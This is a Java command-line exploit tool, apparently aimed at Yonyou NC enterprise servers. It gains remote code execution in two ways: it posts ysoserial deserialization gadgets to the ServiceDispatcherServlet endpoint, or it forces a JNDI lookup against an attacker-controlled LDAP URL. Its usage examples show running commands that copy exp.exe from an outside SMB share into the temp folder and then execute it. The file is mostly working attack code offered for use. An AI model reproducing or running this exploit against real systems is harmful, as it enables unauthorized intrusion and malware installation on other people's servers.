package com.example;


import nc.bs.framework.common.NCLocator;
import nc.bs.framework.comn.NetObjectOutputStream;
import org.apache.commons.cli.*;
import org.asynchttpclient.AsyncCompletionHandler;
import org.asynchttpclient.AsyncHttpClient;
import org.asynchttpclient.DefaultAsyncHttpClient;
import org.asynchttpclient.Response;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Properties;

/**
 * 该类实现指定形式的用友NC RCE攻击
 */
public class NCExploit {

    private void printUsage(Options options) {
        HelpFormatter formatter = new HelpFormatter();
        formatter.printHelp("Options", options);
        System.out.println("Example: ");
        System.out.println("\t\t-t http://1.1.1.1/ -m jndi -j ldap://2.2.2.2/Exp\n" +
                "\t\t-t http://1.1.1.1/ -m serial -g CommonsCollections1 -c \"ping -n 1 www.qq.com\"");
        System.out.println("利用示例：");
        System.out.println("java -jar yongyouNC-Exp.jar -t http://192.168.127.55:8080/ -m serial -g CommonsCollections1 -c \"cmd.exe /c replace.exe \\\\106.13.22.69\\TMP\\exp.exe %tmp% /A\"");
        System.out.println("java -jar yongyouNC-Exp.jar -t http://192.168.127.55:8080/ -m serial -g CommonsCollections1 -c \"cmd.exe /c %tmp%\\exp.exe\"");
    }

    private void attackJndi(String url, String jndipath) {
        Properties env = new Properties();
        env.put("SERVICEDISPATCH_URL", url + "/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }

    private void attackUnserial(String url, String gadget, String cmd)  {
        url = url + "/ServiceDispatcherServlet/xxxx";
        try {

            ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
            Object obj = payload.getObject(cmd);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();

            ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(obj, false, false);

            NetObjectOutputStream.writeInt(bos, temp.toByteArray().length);

            temp.writeTo(bos);

            AsyncHttpClient c = new DefaultAsyncHttpClient();

            c.preparePost(url)
                    .setHeader("Content-Type", "application/x-java-serialized-object")
                    .setBody(bos.toByteArray())
                    .execute(new AsyncCompletionHandler<Response>() {
                        @Override
                        public Response onCompleted(Response response) throws Exception {
                            System.out.println("Server Return Data: ");
                            System.out.println(response.getResponseBody());
                            return response;
                        }

                        @Override
                        public void onThrowable(Throwable t) {
                            System.out.println("HTTP出现异常");
                            t.printStackTrace();
                            super.onThrowable(t);
                        }
                    }).toCompletableFuture().join();

            c.close();
        } catch (ClassNotFoundException e) {
            System.out.println("[-] Ysoserial Payload Not Found: " + gadget);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void main(String[] args) {
        NCExploit ncExploit = new NCExploit();

        Options options = new Options();
        options.addOption("h", "help", true,"Usage of this tool");

        // -t http://1.1.1.1/ -m jndi -j ldap://2.2.2.2/Exp
        // -t http://1.1.1.1/ -m serial -g CommonsCollections1 -c "ping -n 1 www.qq.com"
        options.addOption("t", "target", true, "Exploit target");
        options.addOption("m", "Exploit Method",true,"How to RCE the target, value: jndi/serial");
        options.addOption("j", "jndiUrl", true, "JNDI Server URL");
        options.addOption("g", "gadget", true, "Ysoserial Gadgets");
        options.addOption("c", "cmd", true, "Command you wanna execute remotely");

        CommandLineParser parser = new BasicParser();

        try {
            CommandLine cli = parser.parse(options, args);

            if (cli.hasOption("h")) {
                ncExploit.printUsage(options);
            } else {
                String target = cli.getOptionValue("t");
                String method = cli.getOptionValue("m");
                String jndiUrl = cli.getOptionValue("j");
                String gadget = cli.getOptionValue("g");
                String cmd = cli.getOptionValue("c");

                if (method == null || target == null) {
                    ncExploit.printUsage(options);
                    System.exit(-1);
                }

                // JNDI注入触发
                if (method.equals("jndi")) {
                    ncExploit.attackJndi(target, jndiUrl);
                }

                //直接反序列化触发
                if (method.equals("serial")) {
                    System.out.println("Select gadget: " + gadget);
                    System.out.println("Command gonna run: " + cmd);
                    if (cmd == null || gadget == null) {
                        ncExploit.printUsage(options);
                        System.exit(-1);
                    }
                    ncExploit.attackUnserial(target, gadget, cmd);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

















